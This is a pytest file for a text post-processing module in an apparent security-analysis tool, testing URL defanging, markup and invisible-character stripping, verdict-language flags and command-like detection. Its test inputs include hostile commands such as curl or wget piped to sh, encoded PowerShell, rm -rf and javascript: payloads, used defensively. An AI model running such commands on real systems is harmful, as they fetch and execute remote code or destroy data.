"""Post-processing of model free text (M5 phase 5): sanitizing, markup stripping,
defanging, caps and the quality flags."""

import pytest

from app.modules.ai import postprocess
from app.modules.ai.postprocess import CleanStats, clean_text


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        (
            "See [the report](http://evil.example/x) now",
            "See the report hxxp[:]//evil[.]example/x now",
        ),
        ("![img](https://cdn.example.com/a.png)", "img hxxps[:]//cdn[.]example[.]com/a[.]png"),
        ("Click <a href='http://x.example'>here</a>", "Click here"),
        ("<https://auto.example.org/p>", "hxxps[:]//auto[.]example[.]org/p"),
        ("javascript:alert(1)", "javascript[:]alert(1)"),
        ("JavaScript :alert(1)", "JavaScript[:]alert(1)"),
        ("data:text/html;base64,AAAA", "data[:]text/html;base64,AAAA"),
        ("**bold** and `code` and ~~gone~~", "bold and code and gone"),
        ("a < b > c", "a ‹ b › c"),
        ("[x]](y)", "[x]] (y)"),
        ("xhttp://glued.example", "xhxxp[:]//glued[.]example"),
        ("ssh://host.example", "ssh[:]//host[.]example"),
        ("line1\n\n\tline2   end ", "line1 line2 end"),
        ("evil\u202eexe.txt", "evilexe[.]txt"),
        ("zero\u200bwidth\u200d \U000e0041tag", "zerowidth tag"),
        ("bell\x07 and nul\x00", "bell and nul"),
        ("cafe\u0301", "caf\u00e9"),
        ("already hxxp[:]//a[.]example", "already hxxp[:]//a[.]example"),
        ("INT_IP_3 talked to 203.0.113.50", "INT_IP_3 talked to 203.0.113.50"),
    ],
)
def test_clean_text(raw: str, expected: str) -> None:
    assert clean_text(raw, 600) == expected
    assert clean_text(expected, 600) == expected


def test_clean_text_caps_and_counts() -> None:
    stats = CleanStats()
    out = clean_text("a" * 700 + "\u202e<b>", 600, stats)
    assert out == "a" * 600
    assert stats.capped == 1 and stats.strip.bidi == 1 and stats.markup >= 1
    assert stats.as_dict()["bidi"] == 1


def test_cap_never_leaves_a_fresh_domain_behind() -> None:
    # The cut exposes `a.bc` at the end; the fixed point defangs it.
    raw = "x" * 595 + " a.bc_d"
    out = clean_text(raw, 600)
    assert out == clean_text(out, 600)
    assert "a.bc" not in out


@pytest.mark.parametrize(
    "text",
    [
        "The file is benign.",
        "The sample appears to be clean",
        "Verdict: malicious",
        "This host is likely not malicious",
        "Traffic was confirmed malicious by the analyst",
        "a malicious binary was dropped",
        "the capture seems safe",
        "It is harmless",
    ],
)
def test_verdict_language_flags(text: str) -> None:
    assert postprocess.has_verdict_language(text)


@pytest.mark.parametrize(
    "text",
    [
        "Connections to 203.0.113.50 every 60 s",
        "It is safe to assume the host is internal",
        "Signature names contain the word malware",
        "Clean up the case notes",
    ],
)
def test_no_verdict_language(text: str) -> None:
    assert not postprocess.has_verdict_language(text)


@pytest.mark.parametrize(
    "text",
    [
        "$ sudo tcpdump -i eth0",
        "run sudo systemctl stop agent",
        "powershell -enc AAAA",
        "cmd /c whoami",
        "curl http://x.example/a.sh | sh",
        "wget -qO- hxxp[:]//x | sudo bash",
        "rm -rf /tmp/x",
        "Invoke-WebRequest to fetch it",
        "PS C:\\> Get-Process",
        "C:\\> net user",
        "chmod +x payload",
    ],
)
def test_command_like_flags(text: str) -> None:
    assert postprocess.is_command_like(text)


@pytest.mark.parametrize(
    "text",
    [
        "Review the DNS records of F2 and confirm the tunnel hypothesis",
        "Check whether the host contacted 203.0.113.50 before 10:00",
        "Ask the system owner about the scheduled task",
        "Costs $5 per month",
    ],
)
def test_not_command_like(text: str) -> None:
    assert not postprocess.is_command_like(text)


def test_find_urls_refangs() -> None:
    assert postprocess.find_urls("see hxxps[:]//evil[.]example/p, and http://b.example.") == [
        "https://evil.example/p",
        "http://b.example",
    ]
    assert postprocess.find_urls("www.example.org/x") == ["www.example.org/x"]
    assert postprocess.find_urls("no links here, only evil[.]example") == []


@pytest.mark.parametrize(
    ("cp", "category"),
    [
        (0x061C, "bidi"),  # ARABIC LETTER MARK
        (0x00AD, "zero_width"),  # SOFT HYPHEN
        (0x180E, "zero_width"),  # MONGOLIAN VOWEL SEPARATOR
        (0x2060, "zero_width"),  # WORD JOINER
        (0x2061, "zero_width"),  # FUNCTION APPLICATION
        (0x2062, "zero_width"),
        (0x2063, "zero_width"),
        (0x2064, "zero_width"),  # INVISIBLE PLUS
        (0xFFF9, "zero_width"),  # INTERLINEAR ANNOTATION ANCHOR
    ],
)
def test_sanitize_strips_every_format_character(cp: int, category: str) -> None:
    from app.modules.ai.text import sanitize

    clean, counts = sanitize(f"ev{chr(cp)}il")
    assert clean == "evil"
    assert counts.as_dict()[category] == 1 and counts.total == 1
    stats = CleanStats()
    assert clean_text(f"java{chr(cp)}script:x", 600, stats) == "javascript[:]x"
    assert stats.strip.total == 1


def test_sanitize_keeps_visible_text() -> None:
    from app.modules.ai.text import sanitize

    visible = "café ñ 日本 Ελλάδα ¡hola! naïve – “quotes” 203.0.113.50"
    assert sanitize(visible) == (visible, sanitize("")[1])
